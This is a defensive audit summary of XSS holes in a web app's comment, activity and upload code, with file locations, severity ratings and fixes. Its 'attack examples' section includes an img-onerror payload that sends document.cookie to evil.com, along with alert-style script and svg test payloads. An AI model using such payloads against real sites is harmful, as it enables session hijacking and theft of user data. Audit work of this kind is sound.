# XSS Vulnerabilities - Quick Reference Summary

## CRITICAL ISSUES (2)

### Issue 1: Comment XSS in Frontend
- **Location**: `/web/src/components/SectionBlock.jsx` (lines 394, 380)
- **Problem**: Direct rendering of `comment.content` and `comment.author` without escaping
- **Fix**: Wrap with `sanitizeUserInput()` from DOMPurify

### Issue 2: Comment Storage Without Sanitization
- **Location**: `/backend/src/routes/workflow.js` (lines 384-389)
- **Problem**: Comment text stored to database with only `.trim()`, no XSS filtering
- **Fix**: Apply `sanitizeString()` before database insert

## HIGH SEVERITY ISSUES (5)

1. **Activity Feed Rendering** - `/web/src/components/RightPanel.jsx` (lines 101, 110)
   - Activity descriptions and usernames rendered without escaping
   
2. **Section Content Rendering** - `/web/src/components/SectionBlock.jsx` (lines 173, 327)
   - Section titles and content rendered without escaping

3. **Name Validation Regex Too Weak** - `/backend/src/routes/uploads.js` (line 152)
   - Simple regex `/<|>|&|"|'|script/i` can be bypassed
   - Use XSS library instead

4. **Activity Metadata Injection** - `/backend/src/routes/activity.js` (lines 16-67)
   - Template strings concatenate unsanitized metadata

5. **Review Notes No Validation** - `/backend/src/routes/workflow.js` (line 252)
   - Review notes parameter not sanitized before database storage

## MEDIUM ISSUES (2)

1. **Missing Middleware** - Comment endpoints don't use validation middleware with XSS protection
2. **Highlighted Text** - Parameter accepted without validation in comments endpoint

## WHAT'S WORKING

- Helmet.js CSP headers configured
- XSS library integrated in validation.js
- File upload security (signature validation, executable detection)
- Rate limiting on all endpoints
- CSRF protection in place
- Strong password validation

## QUICK FIXES

### Frontend (Priority 1)
```bash
npm install dompurify
```

Then in each vulnerable component:
```jsx
import { sanitizeUserInput } from '../utils/sanitize'
// Replace: {comment.content}
// With: {sanitizeUserInput(comment.content)}
```

### Backend (Priority 1)
```javascript
// In workflow.js line 351
const { sanitizeString } = require('../middleware/validation')

// Before database insert:
comment_text = sanitizeString(comment_text)
```

## FILES TO MODIFY

### Frontend
- [ ] `/web/src/components/SectionBlock.jsx` - Create sanitize utility and update rendering
- [ ] `/web/src/components/RightPanel.jsx` - Add sanitization to activity rendering

### Backend  
- [ ] `/backend/src/routes/workflow.js` - Sanitize comments and review notes
- [ ] `/backend/src/routes/uploads.js` - Fix name validation
- [ ] `/backend/src/routes/activity.js` - Sanitize activity descriptions
- [ ] `/backend/src/middleware/validation.js` - Add comment validation schema

## ATTACK EXAMPLES THAT WORK TODAY

```javascript
// Comment XSS
POST /api/workflow/sections/{id}/comments
{
  "comment_text": "<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">"
}

// Review notes XSS  
POST /api/workflow/sections/{id}/review
{
  "review_notes": "<script>alert('XSS')</script>"
}

// Name with XSS
POST /api/r/{code}/upload
form: name = "<svg onload=alert('XSS')>"
```

## TESTING

After fixes, test with:
- `<script>alert('XSS')</script>`
- `<img src=x onerror="alert('XSS')">`
- `<svg/onload=alert('XSS')>`
- `<body onload=alert('XSS')>`

All should be escaped/removed and not execute.

---

**Full Report**: See XSS_VULNERABILITY_REPORT.md
